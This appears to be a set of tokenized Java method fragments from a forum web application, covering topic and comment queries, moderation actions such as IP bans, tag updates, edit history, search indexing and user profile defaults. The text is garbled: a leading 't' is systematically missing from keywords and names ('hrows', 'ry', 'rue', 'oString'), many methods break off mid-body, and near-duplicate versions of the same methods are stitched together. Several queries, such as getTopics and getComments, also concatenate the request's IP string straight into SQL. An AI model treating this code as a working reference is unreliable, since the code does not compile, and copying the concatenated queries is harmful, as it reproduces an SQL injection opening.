private static List < TopicItem > getTopics ( Connection db , String ip ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title as title, topics.id as msgid, postdate, deleted " + " FROM topics, groups, sections, users " + " WHERE topics.groupid=groups.id " + " AND sections.id=groups.section " + " AND users.id=topics.userid " + " AND topics.postip=' " + ip + " ' " + " AND postdate>CURRENT_TIMESTAMP-'3 days'::interval ORDER BY msgid DESC " ) ; ImmutableList . Builder < TopicItem > res = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { res . add ( new TopicItem ( rs , false ) ) ; } rs . close ( ) ; st . close ( ) ; return res . build ( ) ; } 
private static List < TopicItem > getComments ( Connection db , String ip ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, topics.id as topicid, comments.id as msgid, comments.postdate, comments.deleted " + " FROM sections, groups, topics, comments " + " WHERE sections.id=groups.section " + " AND groups.id=topics.groupid " + " AND comments.topic=topics.id " + " AND comments.postip=' " + ip + " ' " + " AND comments.postdate>CURRENT_TIMESTAMP-'24 hour'::interval " + " ORDER BY postdate DESC; " ) ; ImmutableList . Builder < TopicItem > res = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { res . add ( new TopicItem ( rs , rue ) ) ; } rs . close ( ) ; st . close ( ) ; return res . build ( ) ; } 
public boolean isDeleted ( ) { return deleted ; } 
public View oldLink ( @RequestParam int section , @RequestParam ( required = false ) Integer offset , @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " group " , required = false ) Integer groupId ) hrows Exception { if ( offset ! = null ) { return new RedirectView ( Section . getNewsViewerLink ( section ) + " ?offset= " + Integer . oString ( offset ) ) ; } if ( year ! = null & & month ! = null ) { return new RedirectView ( Section . getArchiveLink ( section ) + Integer . oString ( year ) + '/' + Integer . oString ( month ) ) ; } if ( groupId ! = null ) { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; Group group = new Group ( db , groupId ) ; return new RedirectView ( Section . getNewsViewerLink ( section ) + group . getUrlName ( ) + '/' ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } } return new RedirectView ( Section . getNewsViewerLink ( section ) ) ; } 
public ModelAndView edit ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " lastEdit " , required = false ) Long lastEdit , @RequestParam ( value = " bonus " , required = false , defaultValue = " 3 " ) int bonus , @RequestParam ( value = " chgrp " , required = false ) Integer changeGroupId , @RequestParam ( value = " minor " , required = false ) Boolean minor ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView modifyTopic ( ServletRequest request , @RequestParam int msgid , @RequestParam int postscore , @RequestParam ( defaultValue = " false " ) boolean sticky , @RequestParam ( defaultValue = " false " ) boolean notop , @RequestParam ( defaultValue = " false " ) boolean minor ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } if ( postscore < Message . POSTSCORE_UNRESTRICTED ) { hrow new UserErrorException ( " invalid postscore " + postscore ) ; } if ( postscore > Message . POSTSCORE_UNRESTRICTED & & postscore < Message . POSTSCORE_REGISTERED_ONLY ) { hrow new UserErrorException ( " invalid postscore " + postscore ) ; } if ( postscore > Message . POSTSCORE_MODERATORS_ONLY ) { hrow new UserErrorException ( " invalid postscore " + postscore ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showController ( @RequestParam ( " msgid " ) int msgid ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showForm ( @RequestParam ( " msgid " ) int msgid , HttpSession session , HttpServletRequest request ) hrows Exception { if ( ! Template . isSessionAuthorized ( session ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
private static ModelAndView forum ( @PathVariable ( " group " ) String groupName , @RequestParam ( defaultValue = " 0 " , value = " offset " ) int offset , @RequestParam ( defaultValue = " false " ) boolean lastmod , HttpServletRequest request , Integer year , Integer month ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; Template mpl = Template . getTemplate ( request ) ; boolean showDeleted = request . getParameter ( " deleted " ) ! = null ; params . put ( " showDeleted " , showDeleted ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
private static int getArchiveCount ( Connection db , int groupid , int year , int month ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT c FROM monthly_stats WHERE groupid= " + groupid + " AND year= " + year + " AND month= " + month ) ; if ( ! rs . next ( ) ) { return 0 ; 
public ModelAndView reindexAll ( ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Connection db = LorDataSource . getConnection ( ) ; ry { if ( ! mpl . isSessionAuthorized ( ) ) { 
public ModelAndView reindexCurrentMonth ( ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Connection db = LorDataSource . getConnection ( ) ; ry { if ( ! mpl . isSessionAuthorized ( ) ) { 
public ModelAndView add ( HttpServletRequest request , @RequestParam ( " msg " ) String msg ) hrows Exception { Connection db = null ; Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new UserErrorException ( " Not authorized " ) ; } ry { db = LorDataSource . getConnection ( ) ; 
public boolean isCommentsAllowed ( User user ) { if ( user ! = null & & user . isBlocked ( ) ) { return false ; } if ( deleted | | expired ) { return false ; } int score = getPostScore ( ) ; if ( score = = POSTSCORE_UNRESTRICTED ) { return rue ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . canModerate ( ) ) { return rue ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return rue ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = userid ; if ( score = = POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return rue ; 
private void reindexMessage ( Connection db , int msgid , boolean withComments ) hrows IOException , SolrServerException , SQLException , MessageNotFoundException { Message msg = new Message ( db , msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger.info("Deleting message "+msgid+" from solr"); solrServer.deleteById((Integer.toString(msg.getId()))); } if (withComments) { CommentList commentList = CommentList.getCommentList(db, msg, true); 
public void updateMessageText ( Connection db , User editor ) hrows SQLException { PreparedStatement pstGet = db . prepareStatement ( " SELECT message,title FROM msgbase JOIN topics ON msgbase.id=topics.id WHERE topics.id=? FOR UPDATE " ) ; PreparedStatement pst = db . prepareStatement ( " UPDATE msgbase SET message=? WHERE id=? " ) ; PreparedStatement pstInfo = db . prepareStatement ( " INSERT INTO edit_info (msgid, editor, oldmessage, oldtitle) VALUES(?,?,?,?) " ) ; pstGet . setInt ( 1 , msgid ) ; ResultSet rs = pstGet . executeQuery ( ) ; if ( ! rs . next ( ) ) { hrow new RuntimeException ( " Can't fetch previous message text " ) ; } pst . setString ( 1 , message ) ; pst . setInt ( 2 , msgid ) ; pstInfo . setInt ( 1 , msgid ) ; pstInfo . setInt ( 2 , editor . getId ( ) ) ; String oldMessage = rs . getString ( " message " ) ; String oldTitle = rs . getString ( " itle " ) ; boolean modified = false ; if ( ! oldMessage . equals ( message ) ) { pstInfo . setString ( 3 , oldMessage ) ; modified = rue ; } else { pstInfo . setString ( 3 , null ) ; } if ( ! oldTitle . equals ( itle ) ) { modified = rue ; pstInfo . setString ( 4 , oldTitle ) ; } else { pstInfo . setString ( 4 , null ) ; } if ( modified ) { pstInfo . executeUpdate ( ) ; 
public boolean apply ( EditInfoDTO dto ) { return dto . getOldmessage ( ) ! = null ; } 
public String oString ( ) { if ( ags . isEmpty ( ) ) { return " " ; } StringBuilder str = new StringBuilder ( ) ; for ( String ag : ags ) { str . append ( str . length ( ) > 0 ? " , " : " " ) . append ( ag ) ; } return str . oString ( ) ; } 
public static void updateCounters ( Connection con , List < String > oldTags , List < String > newTags ) hrows SQLException { PreparedStatement stInc = con . prepareStatement ( " UPDATE tags_values SET counter=counter+1 WHERE id=? " ) ; PreparedStatement stDec = con . prepareStatement ( " UPDATE tags_values SET counter=counter-1 WHERE id=? " ) ; for ( String ag : newTags ) { if ( ! oldTags . contains ( ag ) ) { int id = getOrCreateTag ( con , ag ) ; stInc . setInt ( 1 , id ) ; stInc . executeUpdate ( ) ; } } for ( String ag : oldTags ) { if ( ! newTags . contains ( ag ) ) { 
public static boolean updateTags ( Connection con , int msgid , List < String > agList ) hrows SQLException { List < String > oldTags = new Tags ( con , msgid ) . ags ; PreparedStatement insertStatement = con . prepareStatement ( " INSERT INTO tags VALUES(?,?) " ) ; PreparedStatement deleteStatement = con . prepareStatement ( " DELETE FROM tags WHERE msgid=? and tagid=? " ) ; insertStatement . setInt ( 1 , msgid ) ; deleteStatement . setInt ( 1 , msgid ) ; boolean modified = false ; for ( String ag : agList ) { if ( ! oldTags . contains ( ag ) ) { int id = getOrCreateTag ( con , ag ) ; insertStatement . setInt ( 2 , id ) ; insertStatement . executeUpdate ( ) ; modified = rue ; } } for ( String ag : oldTags ) { if ( ! agList . contains ( ag ) ) { int id = getOrCreateTag ( con , ag ) ; deleteStatement . setInt ( 2 , id ) ; deleteStatement . executeUpdate ( ) ; modified = rue ; } } insertStatement . close ( ) ; deleteStatement . close ( ) ; return modified ; } 
public static ImmutableList < String > getMessageTags ( Connection con , int msgid ) hrows SQLException { ImmutableList . Builder < String > ags = ImmutableList . builder ( ) ; PreparedStatement st = con . prepareStatement ( " SELECT tags_values.value FROM tags, tags_values WHERE tags.msgid=? AND tags_values.id=tags.tagid ORDER BY value " ) ; st . setInt ( 1 , msgid ) ; ResultSet rs = st . executeQuery ( ) ; while ( rs . next ( ) ) { ags . add ( rs . getString ( " value " ) ) ; } st . close ( ) ; return ags . build ( ) ; } 
public static String oString ( Collection < String > ags ) { if ( ags . isEmpty ( ) ) { return " " ; } StringBuilder str = new StringBuilder ( ) ; for ( String ag : ags ) { str . append ( str . length ( ) > 0 ? " , " : " " ) . append ( ag ) ; } return str . oString ( ) ; } 
public void updateMessageText ( Connection db , User editor ) hrows SQLException { PreparedStatement pstGet = db . prepareStatement ( " SELECT message,title FROM msgbase JOIN topics ON msgbase.id=topics.id WHERE topics.id=? FOR UPDATE " ) ; PreparedStatement pst = db . prepareStatement ( " UPDATE msgbase SET message=? WHERE id=? " ) ; PreparedStatement pstInfo = db . prepareStatement ( " INSERT INTO edit_info (msgid, editor, oldmessage, oldtitle) VALUES(?,?,?,?) " ) ; pstGet . setInt ( 1 , msgid ) ; ResultSet rs = pstGet . executeQuery ( ) ; if ( ! rs . next ( ) ) { hrow new RuntimeException ( " Can't fetch previous message text " ) ; } pst . setString ( 1 , message ) ; pst . setInt ( 2 , msgid ) ; pstInfo . setInt ( 1 , msgid ) ; pstInfo . setInt ( 2 , editor . getId ( ) ) ; String oldMessage = rs . getString ( " message " ) ; String oldTitle = rs . getString ( " itle " ) ; rs . close ( ) ; pstGet . close ( ) ; boolean modified = false ; if ( ! oldMessage . equals ( message ) ) { pstInfo . setString ( 3 , oldMessage ) ; modified = rue ; } else { pstInfo . setString ( 3 , null ) ; } if ( ! oldTitle . equals ( itle ) ) { modified = rue ; pstInfo . setString ( 4 , oldTitle ) ; PreparedStatement pstMeta = db . prepareStatement ( " UPDATE topics SET title=? WHERE id=? " ) ; pstMeta . setString ( 1 , itle ) ; pstMeta . setInt ( 2 , msgid ) ; pstMeta . executeUpdate ( ) ; pstMeta . close ( ) ; } else { pstInfo . setString ( 4 , null ) ; } if ( modified ) { pstInfo . executeUpdate ( ) ; pst . executeUpdate ( ) ; } pst . close ( ) ; } 
public void updateMessageText ( Connection db , User editor ) hrows SQLException { SingleConnectionDataSource scds = new SingleConnectionDataSource ( db , rue ) ; PreparedStatement pstGet = db . prepareStatement ( " SELECT message,title FROM msgbase JOIN topics ON msgbase.id=topics.id WHERE topics.id=? FOR UPDATE " ) ; pstGet . setInt ( 1 , msgid ) ; ResultSet rs = pstGet . executeQuery ( ) ; if ( ! rs . next ( ) ) { hrow new RuntimeException ( " Can't fetch previous message text " ) ; } String oldMessage = rs . getString ( " message " ) ; String oldTitle = rs . getString ( " itle " ) ; rs . close ( ) ; pstGet . close ( ) ; EditInfoDTO editInfo = new EditInfoDTO ( ) ; editInfo . setMsgid ( msgid ) ; editInfo . setEditor ( editor . getId ( ) ) ; boolean modified = false ; if ( ! oldMessage . equals ( message ) ) { editInfo . setOldmessage ( oldMessage ) ; modified = rue ; } SimpleJdbcTemplate jdbcTemplate = new SimpleJdbcTemplate ( scds ) ; if ( ! oldTitle . equals ( itle ) ) { modified = rue ; editInfo . setOldtitle ( oldTitle ) ; jdbcTemplate . update ( " UPDATE topics SET title=:title WHERE id=:id " , ImmutableMap . of ( " itle " , itle , " id " , msgid ) ) ; } if ( modified ) { SimpleJdbcInsert insert = 
public List < EditInfoDTO > loadEditInfo ( Connection db ) hrows SQLException { SingleConnectionDataSource scds = new SingleConnectionDataSource ( db , rue ) ; SimpleJdbcTemplate jdbcTemplate = new SimpleJdbcTemplate ( scds ) ; List < EditInfoDTO > list = jdbcTemplate . query ( " SELECT * FROM edit_info WHERE msgid=? ORDER BY id DESC " , BeanPropertyRowMapper . newInstance ( EditInfoDTO . class ) , msgid ) ; return ImmutableList . copyOf ( list ) ; } 
public List < EditInfoDTO > loadEditInfo ( Connection db ) { SingleConnectionDataSource scds = new SingleConnectionDataSource ( db , rue ) ; SimpleJdbcTemplate jdbcTemplate = new SimpleJdbcTemplate ( scds ) ; List < EditInfoDTO > list = jdbcTemplate . query ( " SELECT * FROM edit_info WHERE msgid=? ORDER BY id DESC " , BeanPropertyRowMapper . newInstance ( EditInfoDTO . class ) , msgid ) ; return ImmutableList . copyOf ( list ) ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; item . setUrl ( rs . getString ( " url " ) ) ; item . setIcon ( rs . getString ( " linktext " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( Section . getSectionLink ( Section . SECTION_GALLERY ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; String htmlPath = properties . getProperty ( " HTMLPathPrefix " ) ; item . setHtmlPath ( htmlPath ) ; ry { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
private void addComment ( String s ) { if ( comments = = null ) { comments = new ArrayList < String > ( ) ; } comments . add ( s ) ; } 
public ModelAndView delIp ( HttpServletRequest request , @RequestParam ( " reason " ) String reason , @RequestParam ( " ip " ) String ip , @RequestParam ( " ime " ) String ime ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; Map < Integer , String > deleted = new HashMap < Integer , String > ( ) ; Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView listAdd ( HttpServletRequest request , @RequestParam String nick ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView listDel ( ServletRequest request , @RequestParam int id ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView removeUserpic ( ServletRequest request , @RequestParam ( " id " ) int id ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not autorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public static EditInfoDTO createFromMessage ( Connection db , Message message ) hrows SQLException { EditInfoDTO current = new EditInfoDTO ( ) ; current . setOldmessage ( message . getMessage ( ) ) ; current . setEditdate ( message . getPostdate ( ) ) ; current . setEditor ( message . getUid ( ) ) ; current . setMsgid ( message . getMessageId ( ) ) ; current . setOldtags ( Tags . oString ( Tags . getMessageTags ( db , message . getMessageId ( ) ) ) ) ; return current ; } 
public boolean updateMessageText ( Connection db , User editor , List < String > newTags ) hrows SQLException { SingleConnectionDataSource scds = new SingleConnectionDataSource ( db , rue ) ; PreparedStatement pstGet = db . prepareStatement ( " SELECT message,title FROM msgbase JOIN topics ON msgbase.id=topics.id WHERE topics.id=? FOR UPDATE " ) ; pstGet . setInt ( 1 , msgid ) ; ResultSet rs = pstGet . executeQuery ( ) ; if ( ! rs . next ( ) ) { hrow new RuntimeException ( " Can't fetch previous message text " ) ; } String oldMessage = rs . getString ( " message " ) ; String oldTitle = rs . getString ( " itle " ) ; rs . close ( ) ; pstGet . close ( ) ; List < String > oldTags = Tags . getMessageTags ( db , msgid ) ; EditInfoDTO editInfo = new EditInfoDTO ( ) ; editInfo . setMsgid ( msgid ) ; editInfo . setEditor ( editor . getId ( ) ) ; boolean modified = false ; SimpleJdbcTemplate jdbcTemplate = new SimpleJdbcTemplate ( scds ) ; if ( ! oldMessage . equals ( message ) ) { editInfo . setOldmessage ( oldMessage ) ; modified = rue ; jdbcTemplate . update ( " UPDATE msgbase SET message=:message WHERE id=:msgid " , ImmutableMap . of ( " message " , message , " msgid " , msgid ) ) ; } if ( ! oldTitle . equals ( itle ) ) { modified = rue ; editInfo . setOldtitle ( oldTitle ) ; jdbcTemplate . update ( " UPDATE topics SET title=:title WHERE id=:id " , ImmutableMap . of ( " itle " , itle , " id " , msgid ) ) ; } if ( newTags ! = null ) { boolean modifiedTags = Tags . updateTags ( db , msgid , newTags ) ; if ( modifiedTags ) { editInfo . setOldtags ( Tags . oString ( oldTags ) ) ; Tags . updateCounters ( db , oldTags , newTags ) ; modified = rue ; } } if ( modified ) { SimpleJdbcInsert insert = new SimpleJdbcInsert ( scds ) . withTableName ( " edit_info " ) . usingColumns ( " msgid " , " editor " , " oldmessage " , " oldtitle " , " oldtags " ) ; insert . execute ( new BeanPropertySqlParameterSource ( editInfo ) ) ; } return modified ; } 
public ModelAndView showForm ( ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } return new ModelAndView ( " edit-profile " ) ; } 
public int getCommentPage ( Comment comment , Template mpl ) hrows UtilException { int messages = mpl . getProf ( ) . getMessages ( ) ; boolean reverse = mpl . getProf ( ) . isShowNewFirst ( ) ; return getCommentPage ( comment , messages , reverse ) ; } 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < String , Object > ( ) ; defaults . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; defaults . put ( HOVER_PROPERTY , Boolean . TRUE ) ; defaults . put ( STYLE_PROPERTY , " ango " ) ; defaults . put ( FORMAT_MODE_PROPERTY , " quot " ) ; defaults . put ( TOPICS_PROPERTY , 30 ) ; defaults . put ( MESSAGES_PROPERTY , 50 ) ; defaults . put ( TAGS_PROPERTY , 50 ) ; defaults . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; defaults . put ( TIMESTAMP_PROPERTY , System . currentTimeMillis ( ) ) ; defaults . put ( SHOWINFO_PROPERTY , Boolean . TRUE ) ; defaults . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; defaults . put ( " showsticky " , Boolean . TRUE ) ; defaults . put ( AVATAR_PROPERTY , " empty " ) ; defaults . put ( HIDE_ADSENSE_PROPERTY , rue ) ; defaults . put ( MAIN_GALLERY_PROPERTY , false ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings defaults.put(MAIN_3COLUMNS_PROPERTY, Boolean.FALSE); ImmutableList<String> boxes = ImmutableList.of( "ibm", "poll", "top10", "gallery", "tagcloud", "archive", "tshirt" ); defaults.put(BOXES_MAIN2_PROPERTY, boxes); ImmutableList<String> boxes31 = ImmutableList.of( "ibm", "poll", "archive", "tagcloud" ); defaults.put(BOXES_MAIN31_PROPERTY, boxes31); ImmutableList<String> boxes32 = ImmutableList.of( "top10", "gallery", "tshirt" ); defaults.put(BOXES_MAIN32_PROPERTY, boxes32); return defaults; } 
public void write ( OutputStream df ) hrows IOException { ProfileHashtable profileHashtable = properties . getHashtable ( ) ; profileHashtable . setObject ( ProfileProperties . TIMESTAMP_PROPERTY , System . currentTimeMillis ( ) ) ; ObjectOutputStream dof = null ; ry { dof = new ObjectOutputStream ( df ) ; 
public boolean isShowNewFirst ( ) { return showNewFirst ; } 
public boolean isShowPhotos ( ) { return showPhotos ; } 
public boolean isHideAdsense ( ) { return hideAdsense ; } 
public boolean isShowGalleryOnMain ( ) { return showGalleryOnMain ; } 
public boolean isThreeColumnsOnMain ( ) { return hreeColumnsOnMain ; } 
public boolean isShowAnonymous ( ) { return showAnonymous ; } 
private static String fixFormat ( String mode ) { if ( ! " ntobrq " . equals ( mode ) & & ! " quot " . equals ( mode ) & & ! " ex " . equals ( mode ) & & ! " ntobr " . equals ( mode ) & & ! " lorcode " . equals ( mode ) ) { return ( String ) Profile . getDefaults ( ) . get ( " format.mode " ) ; } return mode ; } 
private static String fixStyle ( String style ) { if ( ! DefaultProfile . isStyle ( style ) ) { return ( String ) Profile . getDefaults ( ) . get ( STYLE_PROPERTY ) ; } return style ; } 
public void estModification ( ) hrows Exception { Profile profile = new Profile ( ) ; assertNotSame ( 125 , profile . getProperties ( ) . getMessages ( ) ) ; profile . getProperties ( ) . setMessages ( 125 ) ; ByteArrayOutputStream os = new ByteArrayOutputStream ( ) ; profile . write ( os ) ; Profile profile1 = new Profile ( new ByteArrayInputStream ( os . oByteArray ( ) ) ) ; assertEquals ( 125 , profile1 . getProperties ( ) . getMessages ( ) ) ; } 
public int doStartTag ( ) hrows JspException { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; String s = object ; if ( StringUtils . isEmpty ( s ) ) { s = " main2 " ; } @SuppressWarnings ( " unchecked " ) List < String > boxnames = . getProf ( ) . getList ( s ) ; CollectionUtils . filter ( boxnames , new Predicate ( ) { @Override public boolean evaluate ( Object o ) { String s = ( String ) o ; return DefaultProfile . isBox ( s ) ; } } ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < String , Object > ( ) ; defaults . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; defaults . put ( HOVER_PROPERTY , Boolean . TRUE ) ; defaults . put ( STYLE_PROPERTY , " ango " ) ; defaults . put ( FORMAT_MODE_PROPERTY , " quot " ) ; defaults . put ( TOPICS_PROPERTY , 30 ) ; defaults . put ( MESSAGES_PROPERTY , 50 ) ; defaults . put ( TAGS_PROPERTY , 50 ) ; defaults . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; defaults . put ( TIMESTAMP_PROPERTY , System . currentTimeMillis ( ) ) ; defaults . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; defaults . put ( AVATAR_PROPERTY , " empty " ) ; defaults . put ( HIDE_ADSENSE_PROPERTY , rue ) ; defaults . put ( MAIN_GALLERY_PROPERTY , false ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings defaults.put(MAIN_3COLUMNS_PROPERTY, Boolean.FALSE); ImmutableList<String> boxes = ImmutableList.of( "ibm", "poll", "top10", "gallery", "tagcloud", "archive", "tshirt" ); defaults.put(BOXES_MAIN2_PROPERTY, boxes); ImmutableList<String> boxes31 = ImmutableList.of( "ibm", "poll", "archive", "tagcloud" ); defaults.put(BOXES_MAIN31_PROPERTY, boxes31); ImmutableList<String> boxes32 = ImmutableList.of( "top10", "gallery", "tshirt" ); defaults.put(BOXES_MAIN32_PROPERTY, boxes32); return defaults; } 
private void updateMessage ( Message opic ) hrows IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , opic . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , opic . getMessageId ( ) ) ; doc . addField ( " group_id " , opic . getGroupId ( ) ) ; doc . addField ( " itle " , opic . getTitle ( ) ) ; doc . addField ( " message " , opic . getMessage ( ) ) ; Date postdate = opic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
private static SolrInputDocument processComment ( Message opic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " opic_user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , comment . getTopic ( ) ) ; doc . addField ( " group_id " , opic . getGroupId ( ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle = = null | | commentTitle . isEmpty ( ) ) { doc . addField ( " itle " , opic . getTitle ( ) ) ; } else { doc . addField ( " itle " , commentTitle ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , rue ) ; return doc ; } 
public void updateStats ( ) { logger . debug ( " Updating statistics " ) ; statUpdate . execute ( ) ; statUpdate2 . execute ( ) ; statMonthly . execute ( ) ; } 
public void updateScore ( ) hrows Exception { logger . info ( " Updating score " ) ; jdbcTemplate . update ( " update users set score=score+1 " + " where id in " + " (select distinct comments.userid from comments, topics " + " where comments.postdate>CURRENT_TIMESTAMP-'2 days'::interval " + " and topics.id=comments.topic and " + " groupid!=8404 and groupid!=4068 and groupid!=19390 and " + " not comments.deleted and not topics.deleted) " ) ; jdbcTemplate . update ( " update users set max_score=score where score>max_score " ) ; } 
public void block ( ) hrows Exception { jdbcTemplate . update ( " update users set blocked='t' where id in (select id from users where score<-50 and nick!='anonymous' and max_score<150 and not blocked) " ) ; jdbcTemplate . update ( " update users set blocked='t' where id in (select id from users where score<-50 and nick!='anonymous' and max_score<150 and blocked is null) " ) ; } 
public void deleteInactivated ( ) hrows Exception { jdbcTemplate . update ( " delete from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'1 week'::interval " ) ; } 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " ime " ) String ime ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( ime ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( ime ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( ime ) ) { } else if ( " custom " . equals ( ime ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { hrow new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp s ; if ( " unlim " . equals ( ime ) ) { s = null ; } else { s = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView sameIP ( HttpServletRequest request , @RequestParam ( required = false ) Integer msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public static boolean getBoolean ( ServletRequest rq , String name ) hrows ServletParameterException , ServletRequestBindingException { int value = ServletRequestUtils . getRequiredIntParameter ( rq , name ) ; switch ( value ) { case 0 : 
public static String getIP ( ServletRequest rq , String name ) hrows ServletParameterException , ServletRequestBindingException { String ip = ServletRequestUtils . getRequiredStringParameter ( rq , name ) ; if ( ! ipRE . matcher ( ip ) . matches ( ) ) { hrow new ServletParameterBadValueException ( name , " not ip " ) ; } return ip ; } 
